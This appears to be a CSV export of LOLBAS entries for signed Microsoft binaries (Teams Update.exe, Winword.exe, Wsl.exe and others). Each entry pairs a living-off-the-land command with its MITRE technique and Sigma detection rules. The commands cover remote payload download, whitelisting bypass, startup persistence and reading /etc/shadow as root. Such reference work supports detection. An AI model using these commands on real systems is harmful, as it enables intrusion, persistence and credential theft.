Filename,Description,Author,Date,Command,Command Description,Command Usecase,Command Category,Command Privileges,MITRE ATT&CK technique,Operating System,Paths,Detections,Resources,Acknowledgements,URL
"Update.exe","Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.","Oddvar Moe","2019-06-26","Update.exe --processStart payload.exe --process-start-args ""whatever args""","Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.","Application Whitelisting Bypass","AWL Bypass","User","T1218","Windows 7 and up with Microsoft Teams installed","%localappdata%\Microsoft\Teams\update.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_squirrel_lolbin.yml, IOC: Update.exe spawned an unknown process","https://www.youtube.com/watch?v=rOP3hnkj7ls, https://twitter.com/reegun21/status/1144182772623269889, https://twitter.com/MrUn1k0d3r/status/1143928885211537408, https://twitter.com/reegun21/status/1291005287034281990, http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/, https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12, https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56, https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/","Reegun Richard Jayapaul (SpiderLabs, Trustwave) (@reegun21), Mr.Un1k0d3r (@MrUn1k0d3r), Adam (@Hexacorn), Jesus Galvez","http://localhost:4001/lolbas/OtherMSBinaries/Update/"
"Update.exe","Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.","Oddvar Moe","2019-06-26","Update.exe --updateRollback=\\remoteserver\payloadFolder","The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.","Download and execute binary","AWL Bypass","User","T1218","Windows 7 and up with Microsoft Teams installed","%localappdata%\Microsoft\Teams\update.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_squirrel_lolbin.yml, IOC: Update.exe spawned an unknown process","https://www.youtube.com/watch?v=rOP3hnkj7ls, https://twitter.com/reegun21/status/1144182772623269889, https://twitter.com/MrUn1k0d3r/status/1143928885211537408, https://twitter.com/reegun21/status/1291005287034281990, http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/, https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12, https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56, https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/","Reegun Richard Jayapaul (SpiderLabs, Trustwave) (@reegun21), Mr.Un1k0d3r (@MrUn1k0d3r), Adam (@Hexacorn), Jesus Galvez","http://localhost:4001/lolbas/OtherMSBinaries/Update/"
"Update.exe","Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.","Oddvar Moe","2019-06-26","Update.exe --updateRollback=\\remoteserver\payloadFolder","The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.","Download and execute binary","Execute","User","T1218","Windows 7 and up with Microsoft Teams installed","%localappdata%\Microsoft\Teams\update.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_squirrel_lolbin.yml, IOC: Update.exe spawned an unknown process","https://www.youtube.com/watch?v=rOP3hnkj7ls, https://twitter.com/reegun21/status/1144182772623269889, https://twitter.com/MrUn1k0d3r/status/1143928885211537408, https://twitter.com/reegun21/status/1291005287034281990, http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/, https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12, https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56, https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/","Reegun Richard Jayapaul (SpiderLabs, Trustwave) (@reegun21), Mr.Un1k0d3r (@MrUn1k0d3r), Adam (@Hexacorn), Jesus Galvez","http://localhost:4001/lolbas/OtherMSBinaries/Update/"
"Update.exe","Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.","Oddvar Moe","2019-06-26","Update.exe --processStart payload.exe --process-start-args ""whatever args""","Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.","Execute binary","Execute","User","T1218","Windows 7 and up with Microsoft Teams installed","%localappdata%\Microsoft\Teams\update.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_squirrel_lolbin.yml, IOC: Update.exe spawned an unknown process","https://www.youtube.com/watch?v=rOP3hnkj7ls, https://twitter.com/reegun21/status/1144182772623269889, https://twitter.com/MrUn1k0d3r/status/1143928885211537408, https://twitter.com/reegun21/status/1291005287034281990, http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/, https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12, https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56, https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/","Reegun Richard Jayapaul (SpiderLabs, Trustwave) (@reegun21), Mr.Un1k0d3r (@MrUn1k0d3r), Adam (@Hexacorn), Jesus Galvez","http://localhost:4001/lolbas/OtherMSBinaries/Update/"
"Update.exe","Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.","Oddvar Moe","2019-06-26","Update.exe --createShortcut=payload.exe -l=Startup","Copy your payload into ""%localappdata%\Microsoft\Teams\current\"". Then run the command. Update.exe will create a payload.exe shortcut in ""%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"". Then payload will run on every login of the user who runs it.","Execute binary","Execute","User","T1547","Windows 7 and up with Microsoft Teams installed","%localappdata%\Microsoft\Teams\update.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_squirrel_lolbin.yml, IOC: Update.exe spawned an unknown process","https://www.youtube.com/watch?v=rOP3hnkj7ls, https://twitter.com/reegun21/status/1144182772623269889, https://twitter.com/MrUn1k0d3r/status/1143928885211537408, https://twitter.com/reegun21/status/1291005287034281990, http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/, https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12, https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56, https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/","Reegun Richard Jayapaul (SpiderLabs, Trustwave) (@reegun21), Mr.Un1k0d3r (@MrUn1k0d3r), Adam (@Hexacorn), Jesus Galvez","http://localhost:4001/lolbas/OtherMSBinaries/Update/"
"Update.exe","Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.","Oddvar Moe","2019-06-26","Update.exe --removeShortcut=payload.exe -l=Startup","Run the command to remove the shortcut created in the ""%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"" directory you created with the LolBinExecution ""--createShortcut"" described on this page.","Execute binary","Execute","User","T1070","Windows 7 and up with Microsoft Teams installed","%localappdata%\Microsoft\Teams\update.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_squirrel_lolbin.yml, IOC: Update.exe spawned an unknown process","https://www.youtube.com/watch?v=rOP3hnkj7ls, https://twitter.com/reegun21/status/1144182772623269889, https://twitter.com/MrUn1k0d3r/status/1143928885211537408, https://twitter.com/reegun21/status/1291005287034281990, http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/, https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12, https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56, https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/","Reegun Richard Jayapaul (SpiderLabs, Trustwave) (@reegun21), Mr.Un1k0d3r (@MrUn1k0d3r), Adam (@Hexacorn), Jesus Galvez","http://localhost:4001/lolbas/OtherMSBinaries/Update/"
"VSIISExeLauncher.exe","Binary will execute specified binary. Part of VS/VScode installation.","timwhite","2021-09-24","VSIISExeLauncher.exe -p [PATH_TO_BIN] -a ""argument here""","The above binary will execute other binary.","Execute any binary with given arguments.","Execute","User","T1218","Windows 10 and up with VS/VScode installed","C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Common7\IDE\Extensions\Microsoft\Web Tools\ProjectSystem\VSIISExeLauncher.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_vsiisexelauncher.yml, IOC: VSIISExeLauncher.exe spawned an unknown process","https://github.com/timwhitez","timwhite","http://localhost:4001/lolbas/OtherMSBinaries/VSIISExeLauncher/"
"vsjitdebugger.exe","Just-In-Time (JIT) debugger included with Visual Studio","Oddvar Moe","2018-05-25","Vsjitdebugger.exe calc.exe","Executes calc.exe as a subprocess of Vsjitdebugger.exe.","Execution of local PE file as a subprocess of Vsjitdebugger.exe.","Execute","User","T1127","Windows","c:\windows\system32\vsjitdebugger.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/8beb70e970b814d0ab60625206ea0d8a21a9bff8/rules/windows/process_creation/win_susp_use_of_vsjitdebugger_bin.yml","https://twitter.com/pabraeken/status/990758590020452353","Pierre-Alexandre Braeken (@pabraeken)","http://localhost:4001/lolbas/OtherMSBinaries/Vsjitdebugger/"
"Wfc.exe","The Workflow Command-line Compiler tool is included with the Windows Software Development Kit (SDK).","Jimmy (@bohops)","2021-09-26","wfc.exe c:\path\to\test.xoml","Execute arbitrary C# code embedded in a XOML file.","Execute proxied payload with Microsoft signed binary to bypass WDAC policies","AWL Bypass","User","T1127","Windows 10 2004 (likely previous and newer versions as well)","C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\wfc.exe","BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules, Sigma: https://github.com/SigmaHQ/sigma/blob/6b34764215b0e97e32cbc4c6325fc933d2695c3a/rules/windows/process_creation/proc_creation_win_lolbin_wfc.yml, IOC: As a Windows SDK binary, execution on a system may be suspicious","https://bohops.com/2020/11/02/exploring-the-wdac-microsoft-recommended-block-rules-part-ii-wfc-fsi/","Matt Graeber (@mattifestation), Jimmy (@bohops)","http://localhost:4001/lolbas/OtherMSBinaries/Wfc/"
"Winword.exe","Microsoft Office binary","Reegun J (OCBC Bank)","2019-07-19","winword.exe ""http://192.168.1.10/TeamsAddinLoader.dll""","Downloads payload from remote server","It will download a remote payload and place it in the cache folder","Download","User","T1105","Windows","C:\Program Files\Microsoft Office\root\Office16\winword.exe, C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\winword.exe, C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\winword.exe, C:\Program Files (x86)\Microsoft Office\Office16\winword.exe, C:\Program Files\Microsoft Office\Office16\winword.exe, C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\winword.exe, C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\winword.exe, C:\Program Files (x86)\Microsoft Office\Office15\winword.exe, C:\Program Files\Microsoft Office\Office15\winword.exe, C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\winword.exe, C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\winword.exe, C:\Program Files (x86)\Microsoft Office\Office14\winword.exe, C:\Program Files\Microsoft Office\Office14\winword.exe, C:\Program Files (x86)\Microsoft Office\Office12\winword.exe, C:\Program Files\Microsoft Office\Office12\winword.exe, C:\Program Files\Microsoft Office\Office12\winword.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_winword.yml, IOC: Suspicious Office application Internet/network traffic","https://twitter.com/reegun21/status/1150032506504151040, https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191","Reegun J (OCBC Bank) (@reegun21)","http://localhost:4001/lolbas/OtherMSBinaries/Winword/"
"Wsl.exe","Windows subsystem for Linux executable","Matthew Brown","2019-06-27","wsl.exe -e /mnt/c/Windows/System32/calc.exe","Executes calc.exe from wsl.exe","Performs execution of specified file, can be used to execute arbitrary Linux commands.","Execute","User","T1202","Windows 10, Windows 19 Server","C:\Windows\System32\wsl.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/2a4e6d8ebeb07d294e6d16a083361bd7e53df7b3/rules/windows/process_creation/proc_creation_win_lolbin_susp_wsl.yml, BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules, IOC: Child process from wsl.exe","https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules, https://twitter.com/nas_bench/status/1535431474429808642","Alex Ionescu (@aionescu), Matt (@NotoriousRebel1), Asif Matadar (@d1r4c), Nasreddine Bencherchali (@nas_bench)","http://localhost:4001/lolbas/OtherMSBinaries/Wsl/"
"Wsl.exe","Windows subsystem for Linux executable","Matthew Brown","2019-06-27","wsl.exe -u root -e cat /etc/shadow","Cats /etc/shadow file as root","Performs execution of arbitrary Linux commands as root without need for password.","Execute","User","T1202","Windows 10, Windows 19 Server","C:\Windows\System32\wsl.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/2a4e6d8ebeb07d294e6d16a083361bd7e53df7b3/rules/windows/process_creation/proc_creation_win_lolbin_susp_wsl.yml, BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules, IOC: Child process from wsl.exe","https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules, https://twitter.com/nas_bench/status/1535431474429808642","Alex Ionescu (@aionescu), Matt (@NotoriousRebel1), Asif Matadar (@d1r4c), Nasreddine Bencherchali (@nas_bench)","http://localhost:4001/lolbas/OtherMSBinaries/Wsl/"
"Wsl.exe","Windows subsystem for Linux executable","Matthew Brown","2019-06-27","wsl.exe --exec bash -c 'cat file'","Cats /etc/shadow file as root","Performs execution of arbitrary Linux commands.","Execute","User","T1202","Windows 10, Windows 19 Server","C:\Windows\System32\wsl.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/2a4e6d8ebeb07d294e6d16a083361bd7e53df7b3/rules/windows/process_creation/proc_creation_win_lolbin_susp_wsl.yml, BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules, IOC: Child process from wsl.exe","https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules, https://twitter.com/nas_bench/status/1535431474429808642","Alex Ionescu (@aionescu), Matt (@NotoriousRebel1), Asif Matadar (@d1r4c), Nasreddine Bencherchali (@nas_bench)","http://localhost:4001/lolbas/OtherMSBinaries/Wsl/"
"Wsl.exe","Windows subsystem for Linux executable","Matthew Brown","2019-06-27","wsl.exe --system calc.exe","Execute the command as root","Performs execution of arbitrary Linux commands as root without need for password.","Execute","User","T1202","Windows 11","C:\Windows\System32\wsl.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/2a4e6d8ebeb07d294e6d16a083361bd7e53df7b3/rules/windows/process_creation/proc_creation_win_lolbin_susp_wsl.yml, BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules, IOC: Child process from wsl.exe","https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules, https://twitter.com/nas_bench/status/1535431474429808642","Alex Ionescu (@aionescu), Matt (@NotoriousRebel1), Asif Matadar (@d1r4c), Nasreddine Bencherchali (@nas_bench)","http://localhost:4001/lolbas/OtherMSBinaries/Wsl/"
